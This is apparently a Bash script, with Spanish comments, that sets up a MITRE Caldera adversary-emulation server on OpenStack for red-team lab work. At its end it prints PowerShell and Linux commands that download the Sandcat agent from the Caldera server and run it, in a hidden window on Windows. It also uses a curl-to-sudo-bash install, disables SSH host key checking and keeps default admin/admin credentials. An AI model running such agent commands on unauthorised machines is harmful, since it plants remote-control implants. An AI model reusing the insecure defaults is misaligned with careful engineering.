#!/bin/bash
# ==========================================
# Despliega una instancia Debian 12 + MITRE Caldera
# ==========================================

# ===== Timer global =====
SCRIPT_START=$(date +%s)
format_time() { local total=$1; echo "$((total/60)) minutos y $((total%60)) segundos"; }

echo "============================================="
echo "    Despliega una instancia en OpenStack:    "
echo "         Debian 12 + MITRE Caldera           "
echo "============================================="

# ===== Activar entorno virtual =====
VENV_DIR="deploy/openstack_venv"
echo "🔹 Activando entorno virtual de OpenStack..."
if [[ -d "$VENV_DIR" ]]; then
    source "$VENV_DIR/bin/activate"
    echo "[✔] Entorno virtual activado correctamente: $VENV_DIR"
else
    echo "[✖] No se encontró el entorno '$VENV_DIR'. Ejecuta primero deploy/openstack-resources.sh"
    exit 1
fi
echo "-------------------------------------------"
sleep 1

# ===== Cargar variables de entorno OpenStack =====
OPENRC_FILE="admin-openrc.sh"
if [[ -f "$OPENRC_FILE" ]]; then
    echo "[+] Cargando variables del entorno OpenStack ($OPENRC_FILE)..."
    source "$OPENRC_FILE"
    echo "[✔] Variables cargadas correctamente."
    echo "-------------------------------------------"
    sleep 1
else
    echo "[✖] No se encontró '$OPENRC_FILE'. Ejecuta primero deploy/openstack-resources.sh"
    exit 1
fi

# =========================
# CONFIGURACIÓN GENERAL
# =========================
IMAGE_NAME="debian-12"
FLAVOR="T_1CPU_2GB"
KEY_NAME="my_key"
SEC_GROUP="sg_basic"

NETWORK_PRIVATE="net_private_01"
SUBNET_PRIVATE="subnet_net_private_01"
NETWORK_EXTERNAL="net_external_01"
ROUTER_NAME="router_private_01"

INSTANCE_NAME="caldera-server"
SSH_USER="debian"
SSH_KEY_PATH="$PWD/deploy/keys/${KEY_NAME}.pem"
USERDATA_FILE="$PWD/deploy/cloud-init/passwd-os.yml"
KNOWN_HOSTS_FILE="$HOME/.ssh/known_hosts"

echo "[✔] Keypair privado: $SSH_KEY_PATH"
echo "[✔] Cloud-init: $USERDATA_FILE"

# =========================
# VERIFICACIÓN DE RECURSOS
# =========================
echo "🔹 Verificando recursos necesarios..."
for res in \
    "openstack image list -f value -c Name|grep -qw $IMAGE_NAME:'Imagen $IMAGE_NAME'" \
    "openstack flavor list -f value -c Name|grep -qw $FLAVOR:'Flavor $FLAVOR'" \
    "openstack keypair list -f value -c Name|grep -qw $KEY_NAME:'Keypair $KEY_NAME'" \
    "openstack security group list -f value -c Name|grep -qw $SEC_GROUP:'Grupo de seguridad $SEC_GROUP'" \
    "openstack network list -f value -c Name|grep -qw $NETWORK_PRIVATE:'Red privada $NETWORK_PRIVATE'" \
    "openstack subnet list -f value -c Name|grep -qw $SUBNET_PRIVATE:'Subred privada $SUBNET_PRIVATE'" \
    "openstack router list -f value -c Name|grep -qw $ROUTER_NAME:'Router $ROUTER_NAME'" \
    "[[ -f $SSH_KEY_PATH ]]:'Clave privada $SSH_KEY_PATH'" \
    "[[ -f $USERDATA_FILE ]]:'Cloud-init $USERDATA_FILE'"
do
    cmd=$(echo $res | cut -d: -f1)
    msg=$(echo $res | cut -d: -f2)
    eval $cmd
    if [[ $? -ne 0 ]]; then
        echo "[✖] Falta recurso: $msg. Ejecuta deploy/openstack-resources.sh"
        exit 1
    else
        echo "[✔] Recurso existente: $msg"
    fi
done
echo "-------------------------------------------"

# =========================
# ELIMINAR INSTANCIA PREVIA
# =========================
EXISTING=$(openstack server list -f value -c Name | grep -w "$INSTANCE_NAME")
if [[ -n "$EXISTING" ]]; then
    echo "[!] Existe instancia '$INSTANCE_NAME'. Eliminando..."
    for s in $EXISTING; do openstack server delete "$s"; done
    until ! openstack server list -f value -c Name | grep -qw "$INSTANCE_NAME"; do
        sleep 5; echo -n "."
    done
    echo; echo "[✔] Instancia '$INSTANCE_NAME' eliminada."
fi

# =========================
# CREACIÓN DE LA INSTANCIA
# =========================
echo "🔹 Creando instancia '$INSTANCE_NAME'..."
openstack server create \
  --image "$IMAGE_NAME" \
  --flavor "$FLAVOR" \
  --key-name "$KEY_NAME" \
  --security-group "$SEC_GROUP" \
  --network "$NETWORK_PRIVATE" \
  --user-data "$USERDATA_FILE" \
  "$INSTANCE_NAME"

echo "[+] Esperando que la instancia esté ACTIVE..."
until [[ "$(openstack server show "$INSTANCE_NAME" -f value -c status)" == "ACTIVE" ]]; do
    sleep 5; echo -n "."
done
echo; echo "[✔] Instancia '$INSTANCE_NAME' activa."

# =========================
# IP FLOTANTE
# =========================
FLOATING_IP=$(openstack floating ip list -f value -c "Floating IP Address" -c "Fixed IP Address" | awk '$2=="None"{print $1; exit}')
if [[ -z "$FLOATING_IP" ]]; then
    FLOATING_IP=$(openstack floating ip create "$NETWORK_EXTERNAL" -f value -c floating_ip_address)
fi
ssh-keygen -f "$KNOWN_HOSTS_FILE" -R "$FLOATING_IP" >/dev/null 2>&1
openstack server add floating ip "$INSTANCE_NAME" "$FLOATING_IP"

echo "[✔] IP flotante asignada: $FLOATING_IP"

# =========================
# ESPERA SSH
# =========================
echo "[+] Esperando conexión SSH..."
SSH_TIMEOUT=120
SSH_START=$(date +%s)
until ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" "echo ok" >/dev/null 2>&1; do
    sleep 5; echo -n "."
    NOW=$(date +%s)
    if (( NOW - SSH_START > SSH_TIMEOUT )); then
        echo; echo "[✖] Timeout al intentar conectar por SSH"; exit 1
    fi
done
echo; echo "[✔] SSH disponible en $FLOATING_IP"

# =========================
# INSTALACIÓN CALDERA
# =========================
INSTALL_START=$(date +%s)
ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<'EOF'
set -e

# ===============================
# ACTUALIZACIÓN Y DEPENDENCIAS
# ===============================
echo "🔹 Actualizando índices de paquetes..."
sudo DEBIAN_FRONTEND=noninteractive apt update
echo "🔹 Actualizando paquetes..."
sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y

sudo apt install -y python3 python3-venv python3-pip curl git build-essential

# ===============================
# NODE.JS 20
# ===============================
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# ===============================
# CALDERA Y VIRTUALENV
# ===============================
cd ~
# Clonar Caldera si no existe
if [[ ! -d "caldera" ]]; then
    git clone https://github.com/mitre/caldera.git --recursive
fi

# Crear virtualenv si no existe
if [[ ! -d "caldera_venv" ]]; then
    python3 -m venv ~/caldera_venv
fi

# Activar virtualenv
source ~/caldera_venv/bin/activate

# Actualizar pip dentro del virtualenv
pip install --upgrade pip

# Instalar requerimientos Python
pip install --break-system-packages -r ~/caldera/requirements.txt

# ===============================
# PLUGIN MAGMA
# ===============================
cd ~/caldera/plugins/magma
rm -rf node_modules package-lock.json
npm install vite@2.9.15 @vitejs/plugin-vue@2.3.4 vue@3.2.45 --legacy-peer-deps

# ===============================
# FIN DEL BLOQUE DE INSTALACIÓN
# ===============================
EOF

INSTALL_END=$(date +%s)
echo "[✔] Caldera instalado y configurado."
echo "[⏱] Tiempo de instalación: $(format_time $((INSTALL_END-INSTALL_START)))"

# ===============================
# INICIAR CALDERA EN SEGUNDO PLANO
# ===============================
echo "🔹 Iniciando servidor Caldera en segundo plano..."

ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<'EOF'
# Activar virtualenv antes de arrancar el servidor
source ~/caldera_venv/bin/activate
cd ~/caldera
nohup python3 server.py --insecure --build > caldera.log 2>&1 &
EOF
sleep 20

# =========================
# TIEMPO TOTAL SCRIPT
# =========================
SCRIPT_END=$(date +%s)
echo "===================================================="
echo "[⏱] Tiempo TOTAL del script: $(format_time $((SCRIPT_END-SCRIPT_START)))"
echo "===================================================="

# =========================
# INFORMACIÓN FINAL
# =========================
echo "Acceso SSH:"
echo "[➜] ssh -i $SSH_KEY_PATH $SSH_USER@$FLOATING_IP"
echo "-----------------------------------------------"

CALDERA_SERVER_URL="http://$FLOATING_IP:8888"
echo "Caldera disponible en:"
echo "[🌐] $CALDERA_SERVER_URL"
echo "[🔑] Credenciales por defecto: admin / admin"

# =========================
# COMANDOS AGENTES SANDCAT
# =========================
echo
echo "===================================================="
echo " COMANDOS PARA DESPLEGAR AGENTES SANDCAT DESDE CALDERA"
echo "===================================================="
echo
echo "👉 Ejecutar en cada máquina objetivo"

# --------- Windows (PowerShell) ---------
cat <<EOWIN
[ Windows (PowerShell) ]

\$server = "$CALDERA_SERVER_URL"
\$url    = "\$server/file/download"
\$wc     = New-Object System.Net.WebClient
\$wc.Headers.Add("platform","windows")
\$wc.Headers.Add("file","sandcat.go")
\$data   = \$wc.DownloadData(\$url)
\$path   = "C:\\Users\\Public\\caldera-agent.exe"
[io.file]::WriteAllBytes(\$path, \$data) | Out-Null
Start-Process -FilePath \$path -ArgumentList "-server \$server -group red -v" -WindowStyle hidden

EOWIN

# --------- Linux / Ubuntu / Debian ---------
cat <<EOLINUX
[ Linux / Ubuntu / Debian ]

server="$CALDERA_SERVER_URL"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
chmod +x caldera-agent
./caldera-agent -server "\$server" -group red -v

EOLINUX
